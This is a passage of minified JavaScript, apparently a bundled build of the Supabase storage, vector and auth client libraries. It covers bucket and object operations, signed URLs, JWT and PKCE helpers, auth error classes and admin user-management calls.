r.handleOperation(async()=>({path:(await un(r.fetch,"".concat(r.url,"/object/copy"),{bucketId:r.bucketId,sourceKey:e,destinationKey:t,destinationBucket:null===n||void 0===n?void 0:n.destinationBucket},{headers:r.headers})).Key}))}async createSignedUrl(e,t,n){var r=this;return r.handleOperation(async()=>{let a=r._getFinalPath(e),s=await un(r.fetch,"".concat(r.url,"/object/sign/").concat(a),nn({expiresIn:t},(null===n||void 0===n?void 0:n.transform)?{transform:n.transform}:{}),{headers:r.headers});const o=(null===n||void 0===n?void 0:n.download)?"&download=".concat(!0===n.download?"":n.download):"";return{signedUrl:encodeURI("".concat(r.url).concat(s.signedURL).concat(o))}})}async createSignedUrls(e,t,n){var r=this;return r.handleOperation(async()=>{const a=await un(r.fetch,"".concat(r.url,"/object/sign/").concat(r.bucketId),{expiresIn:t,paths:e},{headers:r.headers}),s=(null===n||void 0===n?void 0:n.download)?"&download=".concat(!0===n.download?"":n.download):"";return a.map(e=>nn(nn({},e),{},{signedUrl:e.signedURL?encodeURI("".concat(r.url).concat(e.signedURL).concat(s)):null}))})}download(e,t,n){const r="undefined"!==typeof(null===t||void 0===t?void 0:t.transform)?"render/image/authenticated":"object",a=this.transformOptsToQueryString((null===t||void 0===t?void 0:t.transform)||{}),s=a?"?".concat(a):"",o=this._getFinalPath(e);return new yn(()=>cn(this.fetch,"".concat(this.url,"/").concat(r,"/").concat(o).concat(s),{headers:this.headers,noResolveJson:!0},n),this.shouldThrowOnError)}async info(e){var t=this;const n=t._getFinalPath(e);return t.handleOperation(async()=>Yt(await cn(t.fetch,"".concat(t.url,"/object/info/").concat(n),{headers:t.headers})))}async exists(e){var t=this;const n=t._getFinalPath(e);try{return await hn(t.fetch,"".concat(t.url,"/object/").concat(n),{headers:t.headers}),{data:!0,error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(Jt(r)&&r instanceof Qt){const e=r.originalError;if([400,404].includes(null===e||void 0===e?void 0:e.status))return{data:!1,error:r}}throw r}}getPublicUrl(e,t){const n=this._getFinalPath(e),r=[],a=(null===t||void 0===t?void 0:t.download)?"download=".concat(!0===t.download?"":t.download):"";""!==a&&r.push(a);const s="undefined"!==typeof(null===t||void 0===t?void 0:t.transform)?"render/image":"object",o=this.transformOptsToQueryString((null===t||void 0===t?void 0:t.transform)||{});""!==o&&r.push(o);let i=r.join("&");return""!==i&&(i="?".concat(i)),{data:{publicUrl:encodeURI("".concat(this.url,"/").concat(s,"/public/").concat(n).concat(i))}}}async remove(e){var t=this;return t.handleOperation(async()=>await fn(t.fetch,"".concat(t.url,"/object/").concat(t.bucketId),{prefixes:e},{headers:t.headers}))}async list(e,t,n){var r=this;return r.handleOperation(async()=>{const a=nn(nn(nn({},bn),t),{},{prefix:e||""});return await un(r.fetch,"".concat(r.url,"/object/list/").concat(r.bucketId),a,{headers:r.headers},n)})}async listV2(e,t){var n=this;return n.handleOperation(async()=>{const r=nn({},e);return await un(n.fetch,"".concat(n.url,"/object/list-v2/").concat(n.bucketId),r,{headers:n.headers},t)})}encodeMetadata(e){return JSON.stringify(e)}toBase64(e){return"undefined"!==typeof Buffer?Buffer.from(e).toString("base64"):btoa(e)}_getFinalPath(e){return"".concat(this.bucketId,"/").concat(e.replace(/^\/+/,""))}_removeEmptyFolders(e){return e.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(e){const t=[];return e.width&&t.push("width=".concat(e.width)),e.height&&t.push("height=".concat(e.height)),e.resize&&t.push("resize=".concat(e.resize)),e.format&&t.push("format=".concat(e.format)),e.quality&&t.push("quality=".concat(e.quality)),t.join("&")}};const kn={"X-Client-Info":"storage-js/".concat("2.97.0")};var xn=class extends mn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0,r=arguments.length>3?arguments[3]:void 0;const a=new URL(e);(null===r||void 0===r?void 0:r.useNewHostname)&&/supabase\.(co|in|red)$/.test(a.hostname)&&!a.hostname.includes("storage.supabase.")&&(a.hostname=a.hostname.replace("supabase.","storage.supabase."));super(a.href.replace(/\/$/,""),nn(nn({},kn),t),n,"storage")}async listBuckets(e){var t=this;return t.handleOperation(async()=>{const n=t.listBucketOptionsToQueryString(e);return await cn(t.fetch,"".concat(t.url,"/bucket").concat(n),{headers:t.headers})})}async getBucket(e){var t=this;return t.handleOperation(async()=>await cn(t.fetch,"".concat(t.url,"/bucket/").concat(e),{headers:t.headers}))}async createBucket(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{public:!1};var n=this;return n.handleOperation(async()=>await un(n.fetch,"".concat(n.url,"/bucket"),{id:e,name:e,type:t.type,public:t.public,file_size_limit:t.fileSizeLimit,allowed_mime_types:t.allowedMimeTypes},{headers:n.headers}))}async updateBucket(e,t){var n=this;return n.handleOperation(async()=>await dn(n.fetch,"".concat(n.url,"/bucket/").concat(e),{id:e,name:e,public:t.public,file_size_limit:t.fileSizeLimit,allowed_mime_types:t.allowedMimeTypes},{headers:n.headers}))}async emptyBucket(e){var t=this;return t.handleOperation(async()=>await un(t.fetch,"".concat(t.url,"/bucket/").concat(e,"/empty"),{},{headers:t.headers}))}async deleteBucket(e){var t=this;return t.handleOperation(async()=>await fn(t.fetch,"".concat(t.url,"/bucket/").concat(e),{},{headers:t.headers}))}listBucketOptionsToQueryString(e){const t={};return e&&("limit"in e&&(t.limit=String(e.limit)),"offset"in e&&(t.offset=String(e.offset)),e.search&&(t.search=e.search),e.sortColumn&&(t.sortColumn=e.sortColumn),e.sortOrder&&(t.sortOrder=e.sortOrder)),Object.keys(t).length>0?"?"+new URLSearchParams(t).toString():""}},Sn=class extends mn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0;super(e.replace(/\/$/,""),nn(nn({},kn),t),n,"storage")}async createBucket(e){var t=this;return t.handleOperation(async()=>await un(t.fetch,"".concat(t.url,"/bucket"),{name:e},{headers:t.headers}))}async listBuckets(e){var t=this;return t.handleOperation(async()=>{const n=new URLSearchParams;void 0!==(null===e||void 0===e?void 0:e.limit)&&n.set("limit",e.limit.toString()),void 0!==(null===e||void 0===e?void 0:e.offset)&&n.set("offset",e.offset.toString()),(null===e||void 0===e?void 0:e.sortColumn)&&n.set("sortColumn",e.sortColumn),(null===e||void 0===e?void 0:e.sortOrder)&&n.set("sortOrder",e.sortOrder),(null===e||void 0===e?void 0:e.search)&&n.set("search",e.search);const r=n.toString(),a=r?"".concat(t.url,"/bucket?").concat(r):"".concat(t.url,"/bucket");return await cn(t.fetch,a,{headers:t.headers})})}async deleteBucket(e){var t=this;return t.handleOperation(async()=>await fn(t.fetch,"".concat(t.url,"/bucket/").concat(e),{},{headers:t.headers}))}from(e){var t=this;if(!(e=>!(!e||"string"!==typeof e)&&!(0===e.length||e.length>100)&&e.trim()===e&&!e.includes("/")&&!e.includes("\\")&&/^[\w!.\*'() &$@=;:+,?-]+$/.test(e))(e))throw new Gt("Invalid bucket name: File, folder, and bucket names must follow AWS object key naming guidelines and should avoid the use of any other characters.");const n=new Kt({baseUrl:this.url,catalogName:e,auth:{type:"custom",getHeaders:async()=>t.headers},fetch:this.fetch}),r=this.shouldThrowOnError;return new Proxy(n,{get(e,t){const n=e[t];return"function"!==typeof n?n:async function(){try{for(var t=arguments.length,a=new Array(t),s=0;s<t;s++)a[s]=arguments[s];return{data:await n.apply(e,a),error:null}}catch(o){if(r)throw o;return{data:null,error:o}}}}})}},En=class extends mn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0;super(e.replace(/\/$/,""),nn(nn({},kn),{},{"Content-Type":"application/json"},t),n,"vectors")}async createIndex(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/CreateIndex"),e,{headers:t.headers})||{})}async getIndex(e,t){var n=this;return n.handleOperation(async()=>await pn.post(n.fetch,"".concat(n.url,"/GetIndex"),{vectorBucketName:e,indexName:t},{headers:n.headers}))}async listIndexes(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/ListIndexes"),e,{headers:t.headers}))}async deleteIndex(e,t){var n=this;return n.handleOperation(async()=>await pn.post(n.fetch,"".concat(n.url,"/DeleteIndex"),{vectorBucketName:e,indexName:t},{headers:n.headers})||{})}},jn=class extends mn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0;super(e.replace(/\/$/,""),nn(nn({},kn),{},{"Content-Type":"application/json"},t),n,"vectors")}async putVectors(e){var t=this;if(e.vectors.length<1||e.vectors.length>500)throw new Error("Vector batch size must be between 1 and 500 items");return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/PutVectors"),e,{headers:t.headers})||{})}async getVectors(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/GetVectors"),e,{headers:t.headers}))}async listVectors(e){var t=this;if(void 0!==e.segmentCount){if(e.segmentCount<1||e.segmentCount>16)throw new Error("segmentCount must be between 1 and 16");if(void 0!==e.segmentIndex&&(e.segmentIndex<0||e.segmentIndex>=e.segmentCount))throw new Error("segmentIndex must be between 0 and ".concat(e.segmentCount-1))}return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/ListVectors"),e,{headers:t.headers}))}async queryVectors(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/QueryVectors"),e,{headers:t.headers}))}async deleteVectors(e){var t=this;if(e.keys.length<1||e.keys.length>500)throw new Error("Keys batch size must be between 1 and 500 items");return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/DeleteVectors"),e,{headers:t.headers})||{})}},Tn=class extends mn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0;super(e.replace(/\/$/,""),nn(nn({},kn),{},{"Content-Type":"application/json"},t),n,"vectors")}async createBucket(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/CreateVectorBucket"),{vectorBucketName:e},{headers:t.headers})||{})}async getBucket(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/GetVectorBucket"),{vectorBucketName:e},{headers:t.headers}))}async listBuckets(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/ListVectorBuckets"),e,{headers:t.headers}))}async deleteBucket(e){var t=this;return t.handleOperation(async()=>await pn.post(t.fetch,"".concat(t.url,"/DeleteVectorBucket"),{vectorBucketName:e},{headers:t.headers})||{})}},Cn=class extends Tn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};super(e,t.headers||{},t.fetch)}from(e){return new Nn(this.url,this.headers,e,this.fetch)}async createBucket(e){return(()=>super.createBucket)().call(this,e)}async getBucket(e){return(()=>super.getBucket)().call(this,e)}async listBuckets(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return(()=>super.listBuckets)().call(this,e)}async deleteBucket(e){return(()=>super.deleteBucket)().call(this,e)}},Nn=class extends En{constructor(e,t,n,r){super(e,t,r),this.vectorBucketName=n}async createIndex(e){return(()=>super.createIndex)().call(this,nn(nn({},e),{},{vectorBucketName:this.vectorBucketName}))}async listIndexes(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return(()=>super.listIndexes)().call(this,nn(nn({},e),{},{vectorBucketName:this.vectorBucketName}))}async getIndex(e){return(()=>super.getIndex)().call(this,this.vectorBucketName,e)}async deleteIndex(e){return(()=>super.deleteIndex)().call(this,this.vectorBucketName,e)}index(e){return new Rn(this.url,this.headers,this.vectorBucketName,e,this.fetch)}},Rn=class extends jn{constructor(e,t,n,r,a){super(e,t,a),this.vectorBucketName=n,this.indexName=r}async putVectors(e){var t=this;return(()=>super.putVectors)().call(t,nn(nn({},e),{},{vectorBucketName:t.vectorBucketName,indexName:t.indexName}))}async getVectors(e){var t=this;return(()=>super.getVectors)().call(t,nn(nn({},e),{},{vectorBucketName:t.vectorBucketName,indexName:t.indexName}))}async listVectors(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};var t=this;return(()=>super.listVectors)().call(t,nn(nn({},e),{},{vectorBucketName:t.vectorBucketName,indexName:t.indexName}))}async queryVectors(e){var t=this;return(()=>super.queryVectors)().call(t,nn(nn({},e),{},{vectorBucketName:t.vectorBucketName,indexName:t.indexName}))}async deleteVectors(e){var t=this;return(()=>super.deleteVectors)().call(t,nn(nn({},e),{},{vectorBucketName:t.vectorBucketName,indexName:t.indexName}))}},Pn=class extends xn{constructor(e){super(e,arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},arguments.length>2?arguments[2]:void 0,arguments.length>3?arguments[3]:void 0)}from(e){return new _n(this.url,this.headers,e,this.fetch)}get vectors(){return new Cn(this.url+"/vector",{headers:this.headers,fetch:this.fetch})}get analytics(){return new Sn(this.url+"/iceberg",this.headers,this.fetch)}};const On="2.97.0",An=3e4,In=9e4,Ln={"X-Client-Info":"gotrue-js/".concat(On)},Dn="X-Supabase-Api-Version",Un={timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"},Mn=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i;class zn extends Error{constructor(e,t,n){super(e),this.__isAuthError=!0,this.name="AuthError",this.status=t,this.code=n}}function Bn(e){return"object"===typeof e&&null!==e&&"__isAuthError"in e}class Fn extends zn{constructor(e,t,n){super(e,t,n),this.name="AuthApiError",this.status=t,this.code=n}}class Vn extends zn{constructor(e,t){super(e),this.name="AuthUnknownError",this.originalError=t}}class qn extends zn{constructor(e,t,n,r){super(e,n,r),this.name=t,this.status=n}}class Wn extends qn{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function Hn(e){return Bn(e)&&"AuthSessionMissingError"===e.name}class Kn extends qn{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class Gn extends qn{constructor(e){super(e,"AuthInvalidCredentialsError",400,void 0)}}class Jn extends qn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;super(e,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=t}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class $n extends qn{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;super(e,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=t}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class Qn extends qn{constructor(){super("PKCE code verifier not found in storage. This can happen if the auth flow was initiated in a different browser or device, or if the storage was cleared. For SSR frameworks (Next.js, SvelteKit, etc.), use @supabase/ssr on both the server and client to store the code verifier in cookies.","AuthPKCECodeVerifierMissingError",400,"pkce_code_verifier_not_found")}}class Yn extends qn{constructor(e,t){super(e,"AuthRetryableFetchError",t,void 0)}}function Xn(e){return Bn(e)&&"AuthRetryableFetchError"===e.name}class Zn extends qn{constructor(e,t,n){super(e,"AuthWeakPasswordError",t,"weak_password"),this.reasons=n}}class er extends qn{constructor(e){super(e,"AuthInvalidJwtError",400,"invalid_jwt")}}const tr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),nr=" \t\n\r=".split(""),rr=(()=>{const e=new Array(128);for(let t=0;t<e.length;t+=1)e[t]=-1;for(let t=0;t<nr.length;t+=1)e[nr[t].charCodeAt(0)]=-2;for(let t=0;t<tr.length;t+=1)e[tr[t].charCodeAt(0)]=t;return e})();function ar(e,t,n){if(null!==e)for(t.queue=t.queue<<8|e,t.queuedBits+=8;t.queuedBits>=6;){const e=t.queue>>t.queuedBits-6&63;n(tr[e]),t.queuedBits-=6}else if(t.queuedBits>0)for(t.queue=t.queue<<6-t.queuedBits,t.queuedBits=6;t.queuedBits>=6;){const e=t.queue>>t.queuedBits-6&63;n(tr[e]),t.queuedBits-=6}}function sr(e,t,n){const r=rr[e];if(!(r>-1)){if(-2===r)return;throw new Error('Invalid Base64-URL character "'.concat(String.fromCharCode(e),'"'))}for(t.queue=t.queue<<6|r,t.queuedBits+=6;t.queuedBits>=8;)n(t.queue>>t.queuedBits-8&255),t.queuedBits-=8}function or(e){const t=[],n=e=>{t.push(String.fromCodePoint(e))},r={utf8seq:0,codepoint:0},a={queue:0,queuedBits:0},s=e=>{!function(e,t,n){if(0===t.utf8seq){if(e<=127)return void n(e);for(let n=1;n<6;n+=1)if(0===(e>>7-n&1)){t.utf8seq=n;break}if(2===t.utf8seq)t.codepoint=31&e;else if(3===t.utf8seq)t.codepoint=15&e;else{if(4!==t.utf8seq)throw new Error("Invalid UTF-8 sequence");t.codepoint=7&e}t.utf8seq-=1}else if(t.utf8seq>0){if(e<=127)throw new Error("Invalid UTF-8 sequence");t.codepoint=t.codepoint<<6|63&e,t.utf8seq-=1,0===t.utf8seq&&n(t.codepoint)}}(e,r,n)};for(let o=0;o<e.length;o+=1)sr(e.charCodeAt(o),a,s);return t.join("")}function ir(e,t){if(!(e<=127)){if(e<=2047)return t(192|e>>6),void t(128|63&e);if(e<=65535)return t(224|e>>12),t(128|e>>6&63),void t(128|63&e);if(e<=1114111)return t(240|e>>18),t(128|e>>12&63),t(128|e>>6&63),void t(128|63&e);throw new Error("Unrecognized Unicode codepoint: ".concat(e.toString(16)))}t(e)}function lr(e,t){for(let n=0;n<e.length;n+=1){let r=e.charCodeAt(n);if(r>55295&&r<=56319){const t=1024*(r-55296)&65535;r=65536+(e.charCodeAt(n+1)-56320&65535|t),n+=1}ir(r,t)}}function cr(e){const t=[],n={queue:0,queuedBits:0},r=e=>{t.push(e)};for(let a=0;a<e.length;a+=1)sr(e.charCodeAt(a),n,r);return new Uint8Array(t)}function ur(e){const t=[],n={queue:0,queuedBits:0},r=e=>{t.push(e)};return e.forEach(e=>ar(e,n,r)),ar(null,n,r),t.join("")}const dr=()=>"undefined"!==typeof window&&"undefined"!==typeof document,hr={tested:!1,writable:!1},fr=()=>{if(!dr())return!1;try{if("object"!==typeof globalThis.localStorage)return!1}catch(Oa){return!1}if(hr.tested)return hr.writable;const e="lswt-".concat(Math.random()).concat(Math.random());try{globalThis.localStorage.setItem(e,e),globalThis.localStorage.removeItem(e),hr.tested=!0,hr.writable=!0}catch(Oa){hr.tested=!0,hr.writable=!1}return hr.writable};const pr=e=>e?function(){return e(...arguments)}:function(){return fetch(...arguments)},mr=async(e,t,n)=>{await e.setItem(t,JSON.stringify(n))},gr=async(e,t)=>{const n=await e.getItem(t);if(!n)return null;try{return JSON.parse(n)}catch(r){return n}},vr=async(e,t)=>{await e.removeItem(t)};class yr{constructor(){this.promise=new yr.promiseConstructor((e,t)=>{this.resolve=e,this.reject=t})}}function br(e){const t=e.split(".");if(3!==t.length)throw new er("Invalid JWT structure");for(let n=0;n<t.length;n++)if(!Mn.test(t[n]))throw new er("JWT not in base64url format");return{header:JSON.parse(or(t[0])),payload:JSON.parse(or(t[1])),signature:cr(t[2]),raw:{header:t[0],payload:t[1]}}}function wr(e){return("0"+e.toString(16)).substr(-2)}async function _r(e){if(!("undefined"!==typeof crypto&&"undefined"!==typeof crypto.subtle&&"undefined"!==typeof TextEncoder))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),e;const t=await async function(e){const t=(new TextEncoder).encode(e),n=await crypto.subtle.digest("SHA-256",t),r=new Uint8Array(n);return Array.from(r).map(e=>String.fromCharCode(e)).join("")}(e);return btoa(t).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function kr(e,t){let n=arguments.length>2&&void 0!==arguments[2]&&arguments[2];const r=function(){const e=new Uint32Array(56);if("undefined"===typeof crypto){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",t=e.length;let n="";for(let r=0;r<56;r++)n+=e.charAt(Math.floor(Math.random()*t));return n}return crypto.getRandomValues(e),Array.from(e,wr).join("")}();let a=r;n&&(a+="/PASSWORD_RECOVERY"),await mr(e,"".concat(t,"-code-verifier"),a);const s=await _r(r);return[s,r===s?"plain":"s256"]}yr.promiseConstructor=Promise;const xr=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;const Sr=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function Er(e){if(!Sr.test(e))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function jr(){return new Proxy({},{get:(e,t)=>{if("__isUserNotAvailableProxy"===t)return!0;if("symbol"===typeof t){const e=t.toString();if("Symbol(Symbol.toPrimitive)"===e||"Symbol(Symbol.toStringTag)"===e||"Symbol(util.inspect.custom)"===e)return}throw new Error('@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "'.concat(t,'" property of the session object is not supported. Please use getUser() instead.'))},set:(e,t)=>{throw new Error('@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "'.concat(t,'" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.'))},deleteProperty:(e,t)=>{throw new Error('@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "'.concat(t,'" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.'))}})}function Tr(e){return JSON.parse(JSON.stringify(e))}const Cr=e=>e.msg||e.message||e.error_description||e.error||JSON.stringify(e),Nr=[502,503,504];async function Rr(e){var t,n;if(!("object"===typeof(n=e)&&null!==n&&"status"in n&&"ok"in n&&"json"in n&&"function"===typeof n.json))throw new Yn(Cr(e),0);if(Nr.includes(e.status))throw new Yn(Cr(e),e.status);let r,a;try{r=await e.json()}catch(Oa){throw new Vn(Cr(Oa),Oa)}const s=function(e){const t=e.headers.get(Dn);if(!t)return null;if(!t.match(xr))return null;try{return new Date("".concat(t,"T00:00:00.0Z"))}catch(Oa){return null}}(e);if(s&&s.getTime()>=Un.timestamp&&"object"===typeof r&&r&&"string"===typeof r.code?a=r.code:"object"===typeof r&&r&&"string"===typeof r.error_code&&(a=r.error_code),a){if("weak_password"===a)throw new Zn(Cr(r),e.status,(null===(t=r.weak_password)||void 0===t?void 0:t.reasons)||[]);if("session_not_found"===a)throw new Wn}else if("object"===typeof r&&r&&"object"===typeof r.weak_password&&r.weak_password&&Array.isArray(r.weak_password.reasons)&&r.weak_password.reasons.length&&r.weak_password.reasons.reduce((e,t)=>e&&"string"===typeof t,!0))throw new Zn(Cr(r),e.status,r.weak_password.reasons);throw new Fn(Cr(r),e.status||500,a)}async function Pr(e,t,n,r){var a;const s=Object.assign({},null===r||void 0===r?void 0:r.headers);s[Dn]||(s[Dn]=Un.name),(null===r||void 0===r?void 0:r.jwt)&&(s.Authorization="Bearer ".concat(r.jwt));const o=null!==(a=null===r||void 0===r?void 0:r.query)&&void 0!==a?a:{};(null===r||void 0===r?void 0:r.redirectTo)&&(o.redirect_to=r.redirectTo);const i=Object.keys(o).length?"?"+new URLSearchParams(o).toString():"",l=await async function(e,t,n,r,a,s){const o=((e,t,n,r)=>{const a={method:e,headers:(null===t||void 0===t?void 0:t.headers)||{}};return"GET"===e?a:(a.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},null===t||void 0===t?void 0:t.headers),a.body=JSON.stringify(r),Object.assign(Object.assign({},a),n))})(t,r,a,s);let i;try{i=await e(n,Object.assign({},o))}catch(Oa){throw console.error(Oa),new Yn(Cr(Oa),0)}i.ok||await Rr(i);if(null===r||void 0===r?void 0:r.noResolveJson)return i;try{return await i.json()}catch(Oa){await Rr(Oa)}}(e,t,n+i,{headers:s,noResolveJson:null===r||void 0===r?void 0:r.noResolveJson},{},null===r||void 0===r?void 0:r.body);return(null===r||void 0===r?void 0:r.xform)?null===r||void 0===r?void 0:r.xform(l):{data:Object.assign({},l),error:null}}function Or(e){var t;let n=null;var r;(function(e){return e.access_token&&e.refresh_token&&e.expires_in})(e)&&(n=Object.assign({},e),e.expires_at||(n.expires_at=(r=e.expires_in,Math.round(Date.now()/1e3)+r)));return{data:{session:n,user:null!==(t=e.user)&&void 0!==t?t:e},error:null}}function Ar(e){const t=Or(e);return!t.error&&e.weak_password&&"object"===typeof e.weak_password&&Array.isArray(e.weak_password.reasons)&&e.weak_password.reasons.length&&e.weak_password.message&&"string"===typeof e.weak_password.message&&e.weak_password.reasons.reduce((e,t)=>e&&"string"===typeof t,!0)&&(t.data.weak_password=e.weak_password),t}function Ir(e){var t;return{data:{user:null!==(t=e.user)&&void 0!==t?t:e},error:null}}function Lr(e){return{data:e,error:null}}function Dr(e){const{action_link:t,email_otp:n,hashed_token:r,redirect_to:a,verification_type:s}=e,o=Ae(e,["action_link","email_otp","hashed_token","redirect_to","verification_type"]);return{data:{properties:{action_link:t,email_otp:n,hashed_token:r,redirect_to:a,verification_type:s},user:Object.assign({},o)},error:null}}function Ur(e){return e}const Mr=["global","local","others"];class zr{constructor(e){let{url:t="",headers:n={},fetch:r}=e;this.url=t,this.headers=n,this.fetch=pr(r),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)},this.oauth={listClients:this._listOAuthClients.bind(this),createClient:this._createOAuthClient.bind(this),getClient:this._getOAuthClient.bind(this),updateClient:this._updateOAuthClient.bind(this),deleteClient:this._deleteOAuthClient.bind(this),regenerateClientSecret:this._regenerateOAuthClientSecret.bind(this)}}async signOut(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:Mr[0];if(Mr.indexOf(t)<0)throw new Error("@supabase/auth-js: Parameter scope must be one of ".concat(Mr.join(", ")));try{return await Pr(this.fetch,"POST","".concat(this.url,"/logout?scope=").concat(t),{headers:this.headers,jwt:e,noResolveJson:!0}),{data:null,error:null}}catch(n){if(Bn(n))return{data:null,error:n};throw n}}async inviteUserByEmail(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};try{return await Pr(this.fetch,"POST","".concat(this.url,"/invite"),{body:{email:e,data:t.data},headers:this.headers,redirectTo:t.redirectTo,xform:Ir})}catch(n){if(Bn(n))return{data:{user:null},error:n};throw n}}async generateLink(e){try{const{options:t}=e,n=Ae(e,["options"]),r=Object.assign(Object.assign({},n),t);return"newEmail"in n&&(r.new_email=null===n||void 0===n?void 0:n.newEmail,delete r.newEmail),await Pr(this.fetch,"POST","".concat(this.url,"/admin/generate_link"),{body:r,headers:this.headers,xform:Dr,redirectTo:null===t||void 0===t?void 0:t.redirectTo})}catch(t){if(Bn(t))return{data:{properties:null,user:null},error:t};throw t}}async createUser(e){try{return await Pr(this.fetch,"POST","".concat(this.url,"/admin/users"),{body:e,headers:this.headers,xform:Ir})}catch(t){if(Bn(t))return{data:{user:null},error:t};throw t}}async listUsers(e){var t,n,r,a,s,o,i;try{const l={nextPage:null,lastPage:0,total:0},c=await Pr(this.fetch,"GET","".concat(this.url,"/admin/users"),{headers:this.headers,noResolveJson:!0,query:{page:null!==(n=null===(t=null===e||void 0===e?void 0:e.page)||void 0===t?void 0:t.toString())&&void 0!==n?n:"",per_page:null!==(a=null===(r=null===e||void 0===e?void 0:e.perPage)||void 0===r?void 0:r.toString())&&void 0!==a?a:""},xform:Ur});if(c.error)throw c.error;const u=await c.json(),d=null!==(s=c.headers.get("x-total-count"))&&void 0!==s?s:0,h=null!==(i=null===(o=c.headers.get("link"))||void 0===o?void 0:o.split(","))&&void 0!==i?i:[];return h.length>0&&(h.forEach(e=>{const t=parseInt(e.split(";")[0].split("=")[1].substring(0,1)),n=JSON.parse(e.split(";")[1].split("=")[1]);l["".concat(n,"Page")]=t}),l.total=parseInt(d)),{data:Object.assign(Object.assign({},u),l),error:null}}catch(l){if(Bn(l))return{data:{users:[]},error:l};throw l}}async getUserById(e){Er(e);try{return await Pr(this.fetch,"GET","".concat(this.url,"/admin/users/").concat(e),{headers:this.headers,xform:Ir})}catch(t){if(Bn(t))return{data:{user:null},error:t};throw t}}async updateUserById(e,t){Er(e);try{return await Pr(this.fetch,"PUT","".concat(this.url,"/admin/users/").concat(e),{body:t,headers:this.headers,xform:Ir})}catch(n){if(Bn(n))return{data:{user:null},error:n};throw n}}async deleteUser(e){let t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];Er(e);try{return await Pr(this.fetch,"DELETE","".concat(this.url,"/admin/users/").concat(e),{headers:this.headers,body:{should_soft_delete:t},xform:Ir})}catch(n){if(Bn(n))return{data:{user:null},error:n};throw n}}async _listFactors(e){Er(e.userId);try{const{data:t,error:n}=await Pr(this.fetch,"GET","".concat(this.url,"/admin/users/").concat(e.userId,"/factors"),{headers:this.headers,xform:e=>({data:{factors:e},error:null})});return{data:t,error:n}}catch(t){if(Bn(t))return{data:null,error:t};throw t}}async _deleteFactor(e){Er(e.userId),Er(e.id);try{return{data:await Pr(this.fetch,"DELETE","".concat(this.url,"/admin/users/").concat(e.userId,"/factors/").concat(e.id),{headers:this.headers}),error:null}}catch(t){if(Bn(t))return{data:null,error:t};throw t}}async _listOAuthClients(e){var t,n,r,a,s,o,i;try{const l={nextPage:null,lastPage:0,total:0},c=await Pr(this.fetch,"GET","".concat(this.url,"/admin/oauth/clients"),{headers:this.headers,noResolveJson:!0,query:{page:null!==(n=null===(t=null===e||void 0===e?void 0:e.page)||void 0===t?void 0:t.toString())&&void 0!==n?n:"",per_page:null!==(a=null===(r=null===e||void 0===e?void 0:e.perPage)||void 0===r?void 0:r.toString())&&void 0!==a?a:""},xform:Ur});if(c.error)throw c.error;const u=await 